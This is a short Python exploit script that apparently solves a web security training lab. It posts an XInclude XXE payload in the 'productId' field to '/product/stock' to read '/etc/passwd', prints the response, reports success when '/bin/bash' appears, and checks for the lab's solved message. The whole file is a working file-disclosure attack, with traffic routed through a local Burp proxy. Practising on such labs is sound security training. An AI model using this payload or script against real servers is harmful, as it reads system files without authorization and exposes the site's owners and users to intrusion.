import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def xml_payload():
    return {
        "productId": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n<xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
        "storeId": 1
    }

def exploit(s, url, path):
    target_url = url + path
    r = s.post(target_url, data=xml_payload())
    print(r.text)
    if '/bin/bash' in r.text:
        print(f'[+] Successful XXE injection')
    else:
        print(f'[-] Failed to XXE injection')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    exploit(s, url, '/product/stock')
    check_solved_lab(s, url)


if __name__ == '__main__':
    main()